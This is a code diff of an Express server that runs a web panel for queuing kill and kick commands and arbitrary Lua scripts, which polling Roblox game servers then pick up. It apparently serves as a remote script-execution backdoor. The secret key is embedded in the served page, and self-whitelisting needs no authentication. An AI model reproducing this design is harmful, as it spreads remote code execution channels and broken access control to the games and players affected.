@@ -4,9 +4,9 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// --- CONFIGURATION ---
-const SECRET_KEY = "Pass1234"; 
-const ADMIN_USERNAME = "crazy_invader135"; // <--- PUT YOUR USERNAME HERE
+// --- DATA STORAGE ---
+const SECRET_KEY = "MySuperSecret123"; 
+let whitelistedUsers = []; // Stores everyone who whitelists themselves
 let pendingCommand = null;
 
 app.get('/', (req, res) => {
@@ -29,7 +29,7 @@ app.get('/', (req, res) => {
                     cursor: pointer; font-weight: bold; transition: 0.3s;
                 }
                 .btn-primary { background: #007bff; color: white; }
-                .btn-admin { background: #6f42c1; color: white; } /* Purple for Admin focus */
+                .btn-whitelist { background: #ffc107; color: black; }
                 .btn-green { background: #28a745; color: white; }
                 .btn-red { background: #dc3545; color: white; }
                 button:hover { opacity: 0.8; transform: scale(1.05); }
@@ -37,42 +37,50 @@ app.get('/', (req, res) => {
         </head>
         <body>
             <div class="container">
-                <h1>Roblox Command Center</h1>
-                <p>Whitelisted Admin: <b style="color: #6f42c1;">${ADMIN_USERNAME}</b></p>
+                <h1>Roblox Global Panel</h1>
 
                 <div class="section">
-                    <h3>Targeting</h3>
-                    <input type="text" id="targetUser" placeholder="Enter Username...">
+                    <h3>Whitelist Yourself</h3>
+                    <input type="text" id="selfName" placeholder="Enter Your Username...">
                     <br>
-                    <button class="btn-admin" onclick="document.getElementById('targetUser').value = '${ADMIN_USERNAME}'">Target Me</button>
-                    <button class="btn-red" onclick="document.getElementById('targetUser').value = ''">Clear Target</button>
+                    <button class="btn-whitelist" onclick="joinWhitelist()">Join Whitelist</button>
                 </div>
 
                 <div class="section">
-                    <h3>Commands</h3>
+                    <h3>Admin Controls</h3>
+                    <input type="text" id="targetUser" placeholder="Target Player Name...">
+                    <br>
                     <button class="btn-primary" onclick="sendCommand('Kill')">Kill</button>
-                    <button class="btn-primary" onclick="sendCommand('Freeze')">Freeze</button>
-                    <button class="btn-primary" onclick="sendCommand('Thaw')">Unfreeze</button>
                     <button class="btn-green" onclick="sendCommand('LoadWatermark')">Give Watermark</button>
                     <button class="btn-red" onclick="sendCommand('Kick')">Kick</button>
                 </div>
 
                 <div class="section">
-                    <h3>Executor</h3>
-                    <textarea id="luaCode" placeholder="-- Enter Lua Code..."></textarea>
-                    <button class="btn-green" onclick="sendLua()" style="width: 100%;">Execute Script</button>
+                    <h3>Global Executor</h3>
+                    <textarea id="luaCode" placeholder="-- Lua Script..."></textarea>
+                    <button class="btn-green" onclick="sendLua()" style="width: 100%;">Execute</button>
                 </div>
             </div>
 
             <script>
+                async function joinWhitelist() {
+                    const user = document.getElementById('selfName').value;
+                    if(!user) return alert("Enter a name!");
+                    await fetch('/add-whitelist', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ user })
+                    });
+                    alert(user + " added to Whitelist!");
+                }
+
                 async function sendCommand(cmd) {
                     const target = document.getElementById('targetUser').value;
-                    const res = await fetch('/send-command', {
+                    await fetch('/send-command', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ cmd, key: "${SECRET_KEY}", target })
                     });
-                    if(res.ok) console.log("Sent: " + cmd);
                 }
 
                 async function sendLua() {
@@ -82,7 +90,6 @@ app.get('/', (req, res) => {
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ cmd: 'CustomScript', key: "${SECRET_KEY}", script })
                     });
-                    alert("Script Deployed");
                 }
             </script>
         </body>
@@ -90,24 +97,32 @@ app.get('/', (req, res) => {
     `);
 });
 
+// Endpoint for people to whitelist themselves
+app.post('/add-whitelist', (req, res) => {
+    const { user } = req.body;
+    if (user && !whitelistedUsers.includes(user)) {
+        whitelistedUsers.push(user);
+    }
+    res.json({ success: true });
+});
+
+// Roblox calls this to get the command AND the whitelist
+app.get('/get-commands', (req, res) => {
+    res.json({
+        commandData: pendingCommand || { command: "none" },
+        whitelist: whitelistedUsers
+    });
+    pendingCommand = null; 
+});
+
 app.post('/send-command', (req, res) => {
     const { cmd, key, target, script } = req.body;
     if (key === SECRET_KEY) {
         pendingCommand = { command: cmd, target, script };
-        console.log(`Command [${cmd}] set for ${target || "Everyone"}`);
         res.json({ success: true });
     } else {
-        res.status(403).send("Unauthorized");
+        res.status(403).send("Forbidden");
     }
 });
 
-app.get('/get-commands', (req, res) => {
-    if (pendingCommand) {
-        res.json(pendingCommand);
-        pendingCommand = null;
-    } else {
-        res.json({ command: "none" });
-    }
-});
-
-app.listen(PORT, '0.0.0.0', () => console.log("Website Online"));
+app.listen(PORT, '0.0.0.0', () => console.log("Server Running"));
